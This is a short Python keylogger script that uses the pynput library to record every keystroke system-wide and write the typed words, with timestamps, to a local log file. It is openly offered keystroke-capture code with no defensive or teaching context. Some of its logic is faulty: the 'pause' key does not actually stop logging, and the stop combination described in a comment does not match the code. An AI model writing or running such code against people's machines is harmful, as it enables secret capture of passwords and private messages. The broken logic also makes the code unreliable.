import time
import sys
import os
from pynput import keyboard

# Initialize variables for word tracking
current_word = ''
word_start_time = None
stop_recording = False

# Function to log the word with timestamp
def log_word(word, start_time, end_time):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    with open('wordlog.txt', 'a') as log_file:
        log_file.write(f'{timestamp} - {word} (Start: {start_time:.2f}s, End: {end_time:.2f}s)\n')

# Function to handle key press
def on_press(key):
    global current_word, word_start_time, stop_recording

    try:
        # Try to get the character from the key event
        key_data = key.char
    except AttributeError:
        # If the key event is special (like shift, ctrl, etc.), get the name of the key
        key_data = str(key)

    if key_data == ' ':
        # Space encountered, log the current word
        if current_word:
            word_end_time = time.time()
            log_word(current_word, word_start_time, word_end_time)
            current_word = ''
            word_start_time = None
    else:
        # Update the current word
        if not current_word:
            word_start_time = time.time()
        current_word += key_data

    # Check for Alt + K + Shift to stop recording
    if key == keyboard.Key.alt_l and stop_recording:
        stop_recording = False
        print("Keylogger resumed.")
    elif key == keyboard.Key.shift and not stop_recording:
        stop_recording = True
        print("Keylogger paused.")

# Function to handle key release (can be customized if needed)
def on_release(key):
    # Stop listener if 'esc' key is pressed
    if key == keyboard.Key.esc:
        sys.exit()

# Setting up the listener
if __name__ == '__main__':
    try:
        while True:
            with open('wordlog.txt', 'a') as log_file:
                log_file.write('\n--- New session ---\n')
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
